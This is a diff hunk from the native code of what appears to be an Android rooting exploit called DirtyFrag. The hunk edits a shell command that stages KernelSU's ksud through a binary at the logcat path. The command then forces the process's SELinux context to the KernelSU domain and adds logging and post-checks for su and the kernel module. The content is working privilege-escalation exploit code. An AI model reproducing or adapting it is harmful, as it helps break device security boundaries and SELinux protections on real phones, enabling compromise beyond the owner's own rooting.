@@ -617,10 +617,23 @@ Java_dirtyfrag_galaxy_exploit_ExploitNative_nativeRunAll(JNIEnv *env, jclass clz
                     const char *pkg = (*env)->GetStringUTFChars(env, jmanagerPkg, NULL);
                     if (pkg && *pkg) {
                         char cmd[512];
+                        // Keep the late-load child observable on the first OPD2515
+                        // one-APK run.  The previous command discarded every error,
+                        // making a successful DirtyFrag primitive look like a full
+                        // root even when ksud failed before installing /data/adb/ksud.
+                        // This file is only a diagnostic in /data/local/tmp; it is
+                        // removed at the beginning of each run.
                         snprintf(cmd, sizeof(cmd),
-                                 "exec >/dev/null 2>&1; /system/bin/logcat late-load "
+                                 "rm -f /data/local/tmp/df-k.log; "
+                                 "/system/bin/logcat late-load "
                                  "--package-name %s --bootstrap-uid %d "
-                                 "--stage-from /data/system/ksud --ro-partitions & sleep 8; "
+                                 "--stage-from /data/system/ksud --ro-partitions "
+                                 ">/data/local/tmp/df-k.log 2>&1 & sleep 12; "
+                                 "echo post-check: >> /data/local/tmp/df-k.log; "
+                                 "ls -l /data/adb/ksud /system/bin/su "
+                                 ">> /data/local/tmp/df-k.log 2>&1; "
+                                 "grep -i kernelsu /proc/modules "
+                                 ">> /data/local/tmp/df-k.log 2>&1; "
                                  "echo u:r:ksu:s0 > /proc/self/attr/current", pkg,
                                  (int)bootstrapUid);
                         size_t n = strlen(cmd) + 1;
